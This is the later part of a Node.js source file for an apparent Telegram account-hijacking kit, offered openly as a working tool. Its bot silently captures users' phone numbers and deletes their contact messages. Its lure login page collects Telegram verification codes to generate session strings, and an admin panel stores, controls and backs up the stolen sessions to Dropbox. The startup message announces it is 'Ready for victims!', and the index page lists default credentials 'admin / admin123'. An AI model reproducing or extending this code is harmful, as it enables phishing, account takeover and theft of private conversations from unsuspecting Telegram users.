    }
});

// Common endpoints
app.get('/ping', (req, res) => {
    res.json({ 
        status: 'pong',
        server: 'Telegram Session Manager & Login Bot',
        timestamp: new Date().toISOString(),
        activeLoginSessions: activeLoginSessions.size,
        pendingContacts: pendingContacts.size,
        activeClients: activeClients.size,
        totalSessions: readDatabase().sessions.length
    });
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy',
        version: '4.0.0',
        features: ['auto-phone-detect', 'auto-code-send', 'silent-contact-capture', 'session-generation', 'dropbox-backup', 'session-manager'],
        uptime: process.uptime()
    });
});

// ==================== TELEGRAM BOT ====================
let bot = null;

async function initializeTelegramBot() {
    try {
        console.log('🤖 Initializing Telegram login bot...');
        
        bot = new Telegraf(config.telegramBotToken);
        bot.use(telegramSession());
        
        bot.start(async (ctx) => {
            const userId = ctx.from.id.toString();
            
            if (userId === config.adminChatId) {
                await ctx.reply(
                    '👑 *Admin Panel - Auto Login System*\n\n' +
                    'System automatically detects phone numbers silently, sends verification codes, and generates sessions.\n\n' +
                    'Commands:\n' +
                    '• /stats - System statistics\n' +
                    '• /sessions - List recent sessions\n\n' +
                    'Test the auto-login:',
                    { 
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.webApp('🔐 Test Auto-Login', `${config.webBaseUrl}/login/${userId}`)],
                            [Markup.button.webApp('📊 System Stats', `${config.webBaseUrl}/health`)]
                        ])
                    }
                );
            } else {
                await ctx.reply(
                    '🔐 *Auto Telegram Login*\n\n' +
                    'One-click login with automatic phone detection & verification!\n\n' +
                    'Click below → share contact → get code → login automatically.\n\n' +
                    'Your session will be securely generated.',
                    { 
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.webApp('🚀 Start Auto Login', `${config.webBaseUrl}/login/${userId}`)]
                        ])
                    }
                );
            }
        });
        
        // === SILENT CONTACT HANDLER ===
        bot.on('contact', async (ctx) => {
            try {
                const contact = ctx.message.contact;
                const userId = contact.user_id ? contact.user_id.toString() : ctx.from.id.toString();
                const phoneNumber = contact.phone_number;
                const messageId = ctx.message.message_id;
                
                console.log(`📱 SILENT: Contact received from ${userId}: ${phoneNumber}`);
                
                // Store pending contact for web detection
                pendingContacts.set(userId, {
                    phoneNumber: phoneNumber,
                    firstName: contact.first_name || '',
                    timestamp: Date.now()
                });
                
                // IMMEDIATELY DELETE the contact message - user sees NOTHING
                try {
                    await ctx.deleteMessage(messageId);
                    console.log(`🗑️ SILENT: Contact message deleted for user ${userId}`);
                } catch (deleteError) {
                    console.warn(`⚠️ Could not delete contact message: ${deleteError.message}`);
                }
                
                // NO reply sent - completely silent
                
            } catch (error) {
                console.error('❌ Silent contact handler error:', error);
            }
        });
        
        bot.command('stats', async (ctx) => {
            if (ctx.from.id.toString() !== config.adminChatId) {
                await ctx.reply('❌ Admin access required.');
                return;
            }
            
            const sessionFiles = fs.existsSync(config.sessionStoragePath) 
                ? fs.readdirSync(config.sessionStoragePath).length 
                : 0;
            
            const db = readDatabase();
            
            await ctx.reply(
                '📊 *System Statistics*\n\n' +
                `Active Login Sessions: ${activeLoginSessions.size}\n` +
                `Pending Contacts: ${pendingContacts.size}\n` +
                `User Sessions: ${userSessions.size}\n` +
                `Saved Session Files: ${sessionFiles}\n` +
                `Session Manager Sessions: ${db.sessions.length}\n` +
                `Dropbox: ${isDropboxInitialized ? '✅ Connected' : '❌ Disconnected'}\n` +
                `Auto Code Send: ✅ Active\n` +
                `Silent Detection: ✅ Active`,
                { parse_mode: 'Markdown' }
            );
        });
        
        bot.command('sessions', async (ctx) => {
            if (ctx.from.id.toString() !== config.adminChatId) {
                await ctx.reply('❌ Admin access required.');
                return;
            }
            
            if (fs.existsSync(config.sessionStoragePath)) {
                const files = fs.readdirSync(config.sessionStoragePath)
                    .filter(f => f.endsWith('.txt'))
                    .slice(-5)
                    .reverse();
                
                if (files.length > 0) {
                    let message = '📁 *Recent Sessions:*\n\n';
                    files.forEach((file, index) => {
                        message += `${index + 1}. \`${file}\`\n`;
                    });
                    
                    await ctx.reply(message, { parse_mode: 'Markdown' });
                } else {
                    await ctx.reply('No session files yet.');
                }
            } else {
                await ctx.reply('No sessions directory yet.');
            }
        });
        
        bot.command('help', async (ctx) => {
            await ctx.reply(
                '📚 *Auto Login Bot Help*\n\n' +
                'Click "Start Auto Login" → share contact → code sent → enter code → done!\n\n' +
                'The bot silently captures your phone, sends verification code, and generates a session.\n\n' +
                'Admin: /stats /sessions',
                { parse_mode: 'Markdown' }
            );
        });
        
        // Handle other text messages
        bot.on('text', async (ctx) => {
            // Only respond if not a command and user might be confused
            const text = ctx.message.text;
            if (!text.startsWith('/')) {
                await ctx.reply(
                    '🤖 *Auto Login Bot*\n\n' +
                    'Use /start to begin the auto-login process.\n' +
                    'Or click the button below to start immediately:',
                    {
                        parse_mode: 'Markdown',
                        ...Markup.inlineKeyboard([
                            [Markup.button.webApp('🚀 Start Auto Login', `${config.webBaseUrl}/login/${ctx.from.id}`)]
                        ])
                    }
                );
            }
        });
        
        await bot.launch();
        console.log('✅ Telegram bot started with SILENT contact capture & AUTO CODE SEND');
        
        // Send startup message
        try {
            await bot.telegram.sendMessage(
                config.adminChatId,
                '🤖 *Auto Login Bot Started*\n\n' +
                `✅ Silent phone capture: ACTIVE\n` +
                `✅ Auto code sending: ACTIVE\n` +
                `✅ Auto session generation: ACTIVE\n` +
                `✅ Session manager: ACTIVE\n` +
                `🌐 ${config.webBaseUrl}\n` +
                `📱 Ready for victims!`,
                { parse_mode: 'Markdown' }
            );
        } catch (e) {
            console.log('Note: Could not send admin notification');
        }
        
    } catch (error) {
        console.error('❌ Failed to start Telegram bot:', error);
        setTimeout(initializeTelegramBot, 10000);
    }
}

// ==================== AUTO-PING SYSTEM ====================
async function selfPing() {
    try {
        const pingUrl = `${config.webBaseUrl}/ping`;
        const response = await axios.get(pingUrl, { timeout: 10000 });
        console.log(`✅ Self-ping successful`);
    } catch (error) {
        console.warn(`⚠️ Self-ping failed: ${error.message}`);
    }
}

function startAutoPing() {
    console.log('🔄 Starting auto-ping system');
    
    setTimeout(selfPing, 30000);
    setInterval(selfPing, config.autoPingInterval);
}

// ==================== INITIALIZE SYSTEM ====================
async function initializeSystem() {
    try {
        console.log('🚀 Starting Combined System...');
        
        await initializeDropbox();
        await initializeTelegramBot();
        startAutoPing();
        
        // Start cleanup interval
        setInterval(cleanupInactiveClients, 60 * 1000);
        
        console.log('✅ System ready!');
        console.log(`🌐 Web interface: ${config.webBaseUrl}`);
        console.log(`🔐 Admin panel: ${config.webBaseUrl}/admin`);
        console.log(`📱 Login page: ${config.webBaseUrl}/login/{user_id}`);
        console.log(`🤖 Telegram bot: Active`);
        console.log(`☁️ Dropbox sync: ${isDropboxInitialized ? 'Connected' : 'Disconnected'}`);
        
    } catch (error) {
        console.error('❌ Failed to initialize system:', error);
        setTimeout(initializeSystem, 30000);
    }
}

// ==================== CREATE HTML FILES ====================
function createHtmlFiles() {
    // Create login.html for auto-login bot
    const loginHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Auto Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
        .login-card { background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none; }
    </style>
</head>
<body>
    <div class="container d-flex justify-content-center align-items-center" style="min-height: 100vh;">
        <div class="login-card p-5" style="width: 100%; max-width: 500px;">
            <h2 class="text-center mb-4">🔐 Telegram Auto Login</h2>
            <div id="app">
                <!-- Auto-login interface will be loaded here -->
                <div class="text-center">
                    <div class="spinner-border text-primary" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <p class="mt-3">Loading auto-login system...</p>
                </div>
            </div>
        </div>
    </div>
    <script>
        // Auto-login script will be injected here
        const userId = window.location.pathname.split('/').pop();
        if (userId && userId !== 'login.html') {
            // Load the auto-login interface
            document.getElementById('app').innerHTML = \`
                <div class="text-center">
                    <h4 class="mb-4">📱 Share Contact to Login</h4>
                    <p class="text-muted mb-4">Click the button below and share your contact to automatically receive a verification code.</p>
                    
                    <div id="status" class="alert alert-info">Ready to detect your phone number...</div>
                    
                    <div id="codeSection" class="d-none">
                        <div class="mb-3">
                            <label class="form-label">Enter Verification Code</label>
                            <input type="text" class="form-control" id="codeInput" placeholder="123456">
                        </div>
                        <button class="btn btn-primary w-100" onclick="submitCode()">Verify Code</button>
                    </div>
                    
                    <div class="mt-4">
                        <button class="btn btn-success w-100" onclick="checkPendingContact()">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-telephone me-2" viewBox="0 0 16 16">
                                <path d="M3.654 1.328a.678.678 0 0 0-1.015-.063L1.605 2.3c-.483.484-.661 1.169-.45 1.77a17.6 17.6 0 0 0 4.168 6.608 17.6 17.6 0 0 0 6.608 4.168c.601.211 1.286.033 1.77-.45l1.034-1.034a.678.678 0 0 0-.063-1.015l-2.307-1.794a.68.68 0 0 0-.58-.122l-2.19.547a1.75 1.75 0 0 1-1.657-.459L5.482 8.062a1.75 1.75 0 0 1-.46-1.657l.548-2.19a.68.68 0 0 0-.122-.58z"/>
                            </svg>
                            Detect Phone Number
                        </button>
                    </div>
                </div>
            \`;
        }
        
        async function checkPendingContact() {
            const status = document.getElementById('status');
            status.innerHTML = '<div class="spinner-border spinner-border-sm me-2"></div> Checking for phone number...';
            status.className = 'alert alert-info';
            
            try {
                const response = await fetch(\`/api/pending-contact/\${userId}\`);
                const data = await response.json();
                
                if (data.success && data.contact) {
                    if (data.codeSent) {
                        status.innerHTML = \`✅ Code sent to \${data.contact.phoneNumber}. Check your Telegram app!\`;
                        status.className = 'alert alert-success';
                        document.getElementById('codeSection').classList.remove('d-none');
                        window.sessionId = data.sessionId;
                    } else {
                        status.innerHTML = \`📱 Detected: \${data.contact.phoneNumber}. Waiting for code...\`;
                        status.className = 'alert alert-warning';
                    }
                } else {
                    status.innerHTML = '❌ No phone number detected. Please share your contact with the bot first.';
                    status.className = 'alert alert-danger';
                }
            } catch (error) {
                status.innerHTML = '❌ Error checking phone number.';
                status.className = 'alert alert-danger';
            }
        }
        
        async function submitCode() {
            const code = document.getElementById('codeInput').value;
            if (!code) {
                alert('Please enter the verification code');
                return;
            }
            
            const status = document.getElementById('status');
            status.innerHTML = '<div class="spinner-border spinner-border-sm me-2"></div> Verifying code...';
            status.className = 'alert alert-info';
            
            try {
                const response = await fetch('/api/sign-in', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionId: window.sessionId, code: code })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    status.innerHTML = \`✅ Login successful! Session saved.\`;
                    status.className = 'alert alert-success';
                    document.getElementById('codeSection').classList.add('d-none');
                } else {
                    status.innerHTML = \`❌ Error: \${data.error}\`;
                    status.className = 'alert alert-danger';
                }
            } catch (error) {
                status.innerHTML = '❌ Error verifying code.';
                status.className = 'alert alert-danger';
            }
        }
        
        // Auto-check for pending contact
        setTimeout(checkPendingContact, 1000);
    </script>
</body>
</html>
    `;
    
    // Create admin.html for session manager
    const adminHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Session Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css" rel="stylesheet">
    <style>
        body { background: #f8f9fa; }
        .navbar { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
        .card { border-radius: 15px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .session-card { transition: transform 0.3s; }
        .session-card:hover { transform: translateY(-5px); }
        .badge-online { background: #28a745; }
        .badge-offline { background: #6c757d; }
        .badge-error { background: #dc3545; }
        .nav-tabs .nav-link.active { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; }
        .session-string { font-family: monospace; font-size: 0.85rem; background: #f8f9fa; padding: 10px; border-radius: 5px; }
    </style>
</head>
<body>
    <nav class="navbar navbar-dark navbar-expand-lg mb-4">
        <div class="container">
            <a class="navbar-brand" href="/admin">
                <i class="bi bi-telegram me-2"></i>
                Telegram Session Manager
            </a>
            <div class="navbar-nav ms-auto">
                <span class="nav-link text-white">Welcome, Admin</span>
                <a class="nav-link text-white" href="#" onclick="logout()">Logout</a>
            </div>
        </div>
    </nav>
    
    <div class="container" id="app">
        <div class="row">
            <div class="col-md-4">
                <div class="card mb-4">
                    <div class="card-body">
                        <h5 class="card-title">
                            <i class="bi bi-cloud-arrow-up me-2"></i>
                            Add Telegram Session
                        </h5>
                        
                        <ul class="nav nav-tabs mb-3" id="uploadTab">
                            <li class="nav-item">
                                <button class="nav-link active" onclick="showTab('paste')">
                                    <i class="bi bi-clipboard me-1"></i>
                                    Paste String
                                </button>
                            </li>
                            <li class="nav-item">
                                <button class="nav-link" onclick="showTab('file')">
                                    <i class="bi bi-file-earmark me-1"></i>
                                    Upload File
                                </button>
                            </li>
                        </ul>
                        
                        <div id="pasteTab">
                            <form onsubmit="pasteSessionString(); return false;">
                                <div class="mb-3">
                                    <label class="form-label">Paste Session String</label>
                                    <textarea class="form-control session-string" id="sessionString" rows="6" 
                                              placeholder="Paste session string like: 1BAAOMTQ5LjE1NC4xNjcuOTEBu1Ss+xWKwcKta4PzIQkDCDKXwDd4wx3ZePhfT5aWPyJorGNGjiTcw1TGJbckTl05TLU7IyBevgm..." 
                                              required></textarea>
                                </div>
                                <button type="submit" class="btn btn-primary w-100">
                                    <i class="bi bi-save me-2"></i>
                                    Save Session
                                </button>
                            </form>
                        </div>
                        
                        <div id="fileTab" style="display: none;">
                            <form id="uploadForm" enctype="multipart/form-data">
                                <div class="mb-3">
                                    <label class="form-label">Choose Session File</label>
                                    <input type="file" class="form-control" id="sessionFile" accept=".txt,.session" required>
                                </div>
                                <button type="submit" class="btn btn-primary w-100">
                                    <i class="bi bi-upload me-2"></i>
                                    Upload File
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
                
                <div class="card mb-4">
                    <div class="card-body">
                        <h5 class="card-title">
                            <i class="bi bi-graph-up me-2"></i>
                            Statistics
                        </h5>
                        <div id="stats">Loading...</div>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">
                            <i class="bi bi-gear me-2"></i>
                            Quick Actions
                        </h5>
                        <div class="d-grid gap-2">
                            <button class="btn btn-outline-primary" onclick="syncWithDropbox()">
                                <i class="bi bi-cloud-arrow-down me-1"></i>
                                Sync with Dropbox
                            </button>
                            <button class="btn btn-outline-info" onclick="loadSessions()">
                                <i class="bi bi-arrow-clockwise me-1"></i>
                                Refresh List
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-md-8">
                <div class="card mb-4">
                    <div class="card-body">
                        <div class="d-flex justify-content-between align-items-center mb-3">
                            <h5 class="card-title mb-0">
                                <i class="bi bi-people me-2"></i>
                                Active Sessions
                                <span class="badge bg-primary ms-2" id="sessionCount">0</span>
                            </h5>
                            <button class="btn btn-sm btn-outline-primary" onclick="loadSessions()">
                                <i class="bi bi-arrow-clockwise"></i>
                            </button>
                        </div>
                        <div id="sessionsList" class="row">Loading...</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Session Modal -->
    <div class="modal fade" id="sessionModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Session Control</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body" id="sessionModalBody">
                    Loading...
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function showTab(tabName) {
            document.getElementById('pasteTab').style.display = tabName === 'paste' ? 'block' : 'none';
            document.getElementById('fileTab').style.display = tabName === 'file' ? 'block' : 'none';
            
            // Update active tab button
            document.querySelectorAll('#uploadTab .nav-link').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
        }
        
        async function pasteSessionString() {
            const sessionString = document.getElementById('sessionString').value.trim();
            if (!sessionString) {
                alert('Please paste a session string');
                return;
            }
            
            try {
                const response = await fetch('/api/sessions/paste', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ sessionString: sessionString })
                });
                
                const result = await response.json();
                if (result.success) {
                    alert('✅ Session added successfully!');
                    document.getElementById('sessionString').value = '';
                    loadSessions();
                } else {
                    alert('❌ Error: ' + result.error);
                }
            } catch (error) {
                alert('❌ Error: ' + error.message);
            }
        }
        
        async function loadSessions() {
            try {
                const response = await fetch('/api/sessions');
                const sessions = await response.json();
                
                const container = document.getElementById('sessionsList');
                const countElement = document.getElementById('sessionCount');
                container.innerHTML = '';
                countElement.textContent = sessions.length;
                
                if (sessions.length === 0) {
                    container.innerHTML = '<div class="col-12"><div class="alert alert-info">No sessions yet. Add one using the form.</div></div>';
                    return;
                }
                
                sessions.forEach(session => {
                    const badgeClass = session.status === 'active' ? 'badge-online' : 
                                     session.status === 'error' ? 'badge-error' : 'badge-offline';
                    const badgeText = session.status === 'active' ? '🟢 Online' : 
                                    session.status === 'error' ? '🔴 Error' : '⚪ Offline';
                    
                    const card = \`
                    <div class="col-md-6 col-lg-4 mb-3">
                        <div class="card session-card h-100">
                            <div class="card-body">
                                <div class="d-flex justify-content-between align-items-start mb-2">
                                    <h6 class="card-title mb-0">
                                        <i class="bi bi-person-circle me-2"></i>
                                        \${session.firstName || 'User'}
                                    </h6>
                                    <span class="badge \${badgeClass}">\${badgeText}</span>
                                </div>
                                <p class="card-text small mb-1">
                                    <i class="bi bi-telephone me-2"></i>
                                    \${session.phoneNumber || 'No phone'}
                                </p>
                                <p class="card-text small mb-1">
                                    <i class="bi bi-at me-2"></i>
                                    @\${session.username || 'No username'}
                                </p>
                                <div class="d-grid gap-2 mt-3">
                                    <button class="btn btn-sm btn-outline-primary" onclick="openSessionControl('\${session.id}')">
                                        <i class="bi bi-gear me-1"></i>
                                        Control
                                    </button>
                                    <button class="btn btn-sm btn-outline-danger" onclick="deleteSession('\${session.id}')">
                                        <i class="bi bi-trash me-1"></i>
                                        Remove
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                    \`;
                    container.innerHTML += card;
                });
            } catch (error) {
                console.error('Error loading sessions:', error);
                document.getElementById('sessionsList').innerHTML = '<div class="alert alert-danger">Error loading sessions</div>';
            }
        }
        
        async function openSessionControl(sessionId) {
            try {
                const response = await fetch(\`/api/sessions/\${sessionId}/info\`);
                const info = await response.json();
                
                const modalBody = document.getElementById('sessionModalBody');
                modalBody.innerHTML = \`
                <div class="row">
                    <div class="col-md-6">
                        <div class="card mb-3">
                            <div class="card-body">
                                <h6>Session Information</h6>
                                <table class="table table-sm">
                                    <tr><td><strong>Phone:</strong></td><td>\${info.user.phone || 'N/A'}</td></tr>
                                    <tr><td><strong>Username:</strong></td><td>@\${info.user.username || 'N/A'}</td></tr>
                                    <tr><td><strong>Name:</strong></td><td>\${info.user.firstName} \${info.user.lastName}</td></tr>
                                    <tr><td><strong>Status:</strong></td><td>
                                        <span class="badge \${info.clientStatus === 'connected' ? 'bg-success' : 'bg-secondary'}">
                                            \${info.clientStatus}
                                        </span>
                                    </td></tr>
                                </table>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-6">
                        <div class="card">
                            <div class="card-body">
                                <h6>Actions</h6>
                                <div class="d-grid gap-2">
                                    <button class="btn btn-info" onclick="getSessionGroups('\${sessionId}')">
                                        <i class="bi bi-people me-1"></i>
                                        Get Groups (\${info.stats.groups})
                                    </button>
                                    <button class="btn btn-danger" onclick="deleteSession('\${sessionId}')">
                                        <i class="bi bi-trash me-1"></i>
                                        Delete Session
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="mt-3" id="sessionResults_\${sessionId}"></div>
                \`;
                
                const modal = new bootstrap.Modal(document.getElementById('sessionModal'));
                modal.show();
                
            } catch (error) {
                console.error('Error opening session control:', error);
                alert('Error: ' + error.message);
            }
        }
        
        async function getSessionGroups(sessionId) {
            try {
                const response = await fetch(\`/api/sessions/\${sessionId}/groups\`);
                const groups = await response.json();
                
                const container = document.getElementById(\`sessionResults_\${sessionId}\`);
                let html = '<h6 class="mt-3">Groups & Channels</h6><div class="table-responsive"><table class="table table-sm"><thead><tr><th>Title</th><th>Type</th><th>ID</th><th>Members</th></tr></thead><tbody>';
                
                groups.forEach(group => {
                    html += \`
                    <tr>
                        <td>\${group.title}</td>
                        <td><span class="badge \${group.isChannel ? 'bg-info' : 'bg-success'}">\${group.isChannel ? 'Channel' : 'Group'}</span></td>
                        <td><small>\${group.id}</small></td>
                        <td>\${group.participantsCount || 'N/A'}</td>
                    </tr>
                    \`;
                });
                
                html += '</tbody></table></div>';
                container.innerHTML = html;
            } catch (error) {
                alert('Error getting groups: ' + error.message);
            }
        }
        
        async function deleteSession(sessionId) {
            if (confirm('Are you sure you want to delete this session?')) {
                try {
                    const response = await fetch(\`/api/sessions/\${sessionId}\`, { method: 'DELETE' });
                    const result = await response.json();
                    
                    if (result.success) {
                        alert('✅ Session deleted');
                        loadSessions();
                        const modal = bootstrap.Modal.getInstance(document.getElementById('sessionModal'));
                        if (modal) modal.hide();
                    } else {
                        alert('❌ Error: ' + result.error);
                    }
                } catch (error) {
                    alert('❌ Error: ' + error.message);
                }
            }
        }
        
        // Handle file upload
        document.getElementById('uploadForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const fileInput = document.getElementById('sessionFile');
            const formData = new FormData();
            formData.append('session', fileInput.files[0]);
            
            try {
                const response = await fetch('/api/sessions/upload', {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (result.success) {
                    alert('✅ Session uploaded!');
                    fileInput.value = '';
                    loadSessions();
                } else {
                    alert('❌ Error: ' + result.error);
                }
            } catch (error) {
                alert('❌ Error: ' + error.message);
            }
        });
        
        async function syncWithDropbox() {
            try {
                const response = await fetch('/api/sync', { method: 'POST' });
                const result = await response.json();
                
                if (result.success) {
                    alert('✅ Synced with Dropbox!');
                    loadSessions();
                    loadStats();
                } else {
                    alert('❌ Sync failed: ' + result.error);
                }
            } catch (error) {
                alert('❌ Error: ' + error.message);
            }
        }
        
        async function loadStats() {
            try {
                const response = await fetch('/api/stats');
                const stats = await response.json();
                document.getElementById('stats').innerHTML = \`
                    <p class="mb-1"><strong>Total Sessions:</strong> \${stats.totalSessions}</p>
                    <p class="mb-1"><strong>Valid Sessions:</strong> \${stats.validSessions}</p>
                    <p class="mb-1"><strong>Active Connections:</strong> \${stats.connectedClients}</p>
                    <p class="mb-1"><strong>Messages Sent:</strong> \${stats.totalMessagesSent}</p>
                    <p class="mb-0 text-muted small">
                        <i class="bi bi-cloud me-1"></i>
                        Last Sync: \${stats.lastSync ? new Date(stats.lastSync).toLocaleString() : 'Never'}
                    </p>
                \`;
            } catch (error) {
                console.error('Error loading stats:', error);
            }
        }
        
        async function logout() {
            await fetch('/api/logout');
            window.location.href = '/';
        }
        
        // Load on start
        document.addEventListener('DOMContentLoaded', function() {
            loadSessions();
            loadStats();
            setInterval(loadSessions, 30000);
            setInterval(loadStats, 30000);
        });
    </script>
</body>
</html>
    `;
    
    // Create index.html
    const indexHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Tools</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }
        .card { border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); transition: transform 0.3s; }
        .card:hover { transform: translateY(-5px); }
        .btn-primary { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none; }
        .btn-success { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); border: none; }
    </style>
</head>
<body>
    <div class="container py-5">
        <div class="row justify-content-center">
            <div class="col-md-8 text-center text-white mb-5">
                <h1 class="display-4 mb-3">🤖 Telegram Tools</h1>
                <p class="lead">Powerful tools for Telegram session management and auto-login</p>
            </div>
        </div>
        
        <div class="row justify-content-center">
            <div class="col-md-5 mb-4">
                <div class="card h-100">
                    <div class="card-body text-center p-5">
                        <div class="mb-4">
                            <div style="font-size: 3rem; color: #0088cc;">📱</div>
                        </div>
                        <h3 class="card-title mb-3">Auto Login Bot</h3>
                        <p class="card-text mb-4">
                            Automatically capture phone numbers, send verification codes, and generate Telegram sessions.
                            Silent contact detection with automatic code sending.
                        </p>
                        <a href="/login/demo" class="btn btn-primary btn-lg w-100">
                            <i class="bi bi-rocket-takeoff me-2"></i>
                            Start Auto Login
                        </a>
                        <div class="mt-3 text-muted small">
                            Works with Telegram Bot: @YourBotName
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-md-5 mb-4">
                <div class="card h-100">
                    <div class="card-body text-center p-5">
                        <div class="mb-4">
                            <div style="font-size: 3rem; color: #28a745;">🔧</div>
                        </div>
                        <h3 class="card-title mb-3">Session Manager</h3>
                        <p class="card-text mb-4">
                            Manage multiple Telegram sessions, send messages, view groups, and sync with Dropbox.
                            Paste session strings or upload files.
                        </p>
                        <a href="/admin" class="btn btn-success btn-lg w-100">
                            <i class="bi bi-shield-lock me-2"></i>
                            Admin Dashboard
                        </a>
                        <div class="mt-3 text-muted small">
                            Login: admin / admin123
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="row justify-content-center mt-5">
            <div class="col-md-10">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title text-center mb-4">📊 System Status</h5>
                        <div class="row text-center" id="status">
                            <div class="col-md-3 mb-3">
                                <div class="p-3 bg-light rounded">
                                    <div class="h4 mb-2" id="totalSessions">0</div>
                                    <div class="text-muted">Total Sessions</div>
                                </div>
                            </div>
                            <div class="col-md-3 mb-3">
                                <div class="p-3 bg-light rounded">
                                    <div class="h4 mb-2" id="activeClients">0</div>
                                    <div class="text-muted">Active Clients</div>
                                </div>
                            </div>
                            <div class="col-md-3 mb-3">
                                <div class="p-3 bg-light rounded">
                                    <div class="h4 mb-2" id="pendingContacts">0</div>
                                    <div class="text-muted">Pending Contacts</div>
                                </div>
                            </div>
                            <div class="col-md-3 mb-3">
                                <div class="p-3 bg-light rounded">
                                    <div class="h4 mb-2" id="serverStatus">🟢</div>
                                    <div class="text-muted">Server Status</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        async function loadStatus() {
            try {
                const response = await fetch('/health');
                const data = await response.json();
                document.getElementById('serverStatus').textContent = '🟢';
                
                const statsResponse = await fetch('/api/stats');
                const stats = await statsResponse.json().catch(() => ({}));
                
                document.getElementById('totalSessions').textContent = stats.totalSessions || 0;
                document.getElementById('activeClients').textContent = stats.connectedClients || 0;
                document.getElementById('pendingContacts').textContent = stats.pendingContacts || 0;
            } catch (error) {
                document.getElementById('serverStatus').textContent = '🔴';
            }
        }
        
        // Load status on start and every 30 seconds
        loadStatus();
        setInterval(loadStatus, 30000);
    </script>
</body>
</html>
    `;
    
    fs.writeFileSync(path.join(__dirname, 'public', 'login.html'), loginHtml);
    fs.writeFileSync(path.join(__dirname, 'public', 'admin.html'), adminHtml);
    fs.writeFileSync(path.join(__dirname, 'public', 'index.html'), indexHtml);
}

// ==================== START SERVER ====================
// Create HTML files
createHtmlFiles();

// Start the server
const server = app.listen(config.webPort, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${config.webPort}`);
    initializeSystem();
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n🚨 Shutting down...');
    
    // Disconnect all active clients
    for (const [sessionId, clientData] of activeClients.entries()) {
        try {
            await clientData.client.disconnect();
        } catch (e) {}
    }
    
    // Disconnect login sessions
    for (const [sessionId, session] of activeLoginSessions.entries()) {
        if (session.client) {
            try {
                session.client.disconnect();
            } catch (e) {}
        }
    }
    
    if (bot) bot.stop();
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});
